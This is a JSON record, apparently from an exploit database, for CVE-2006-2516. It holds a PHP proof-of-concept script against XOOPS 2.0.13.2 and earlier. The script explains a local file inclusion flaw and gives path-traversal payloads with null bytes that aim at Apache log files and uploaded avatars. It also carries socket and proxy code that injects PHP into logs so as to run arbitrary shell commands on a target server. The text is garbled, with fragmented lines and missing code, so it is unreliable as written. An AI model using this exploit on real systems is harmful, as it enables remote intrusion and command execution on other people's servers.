{
    "text": "vul_name : XOOPS <= 2.0.13.2 'xoopsOption [ nocommon ] ' exploit ， vul_cve : CVE-2006-2516 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"XOOPS <= 2.0.13.2 'xoopsOption [ nocommon ] ' exploitrn\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] rn\" ;  ， echo \"site :  ， works with :  ， magic_quotes_gpc = Off ， register_globals = On ， echo \"Usage : php \". $ argv [ 0 ] .\" host path cmd OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to xoopsrn\" ;  ， echo \"cmd : a shell commandrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Examples : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /xoops/ rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /xoops/ ls -la -p81rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost / ls -la -P1.1.1.1 : 80rn\" ;  ， die ;  ， } ， / * hi , back from my annual social engineering tour , this year in Milan ;  )  ， welcome to this new 0day experience. ， explaination :  ， vulnerable code in mainfile.php at lines 94-96 :  ， . ， include XOOPS_ROOT_PATH.\"/include/common.php\" ;  ， } ， . ， skip common.php inclusion where $ xoopsConfig [ 'language' ] and ，  $ xoopsConfig [ 'theme_set ] are initialized , so , if magic_quotes_gpc=Off ， you can include arbitrary files from local resources , ex. , Apache log files :  ， psConfig [ language ] =././././././././././var/log/httpd/access_lo ， g%00 ， psConfig [ theme_set ] =././././././././././var/log/httpd/error_lo ， g%00 ， or , if avatar uploads are enabled :  ， 1&xoopsConfig [ theme_set ] =./uploads/cavt44703c30d3dbf.jpg%00 ， this tool inject some php code in apache log files and try to launch commands ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ cmd=\" ;  $ port=80 ;  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { $ cmd.=\" \". $ argv [  $ i ]  ; } ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ cmd=urlencode (  $ cmd )  ;  ， echo \" [ 1 ] Injecting some code in log files .rnrn\" ; ",
    "time": "2006.05.24"
}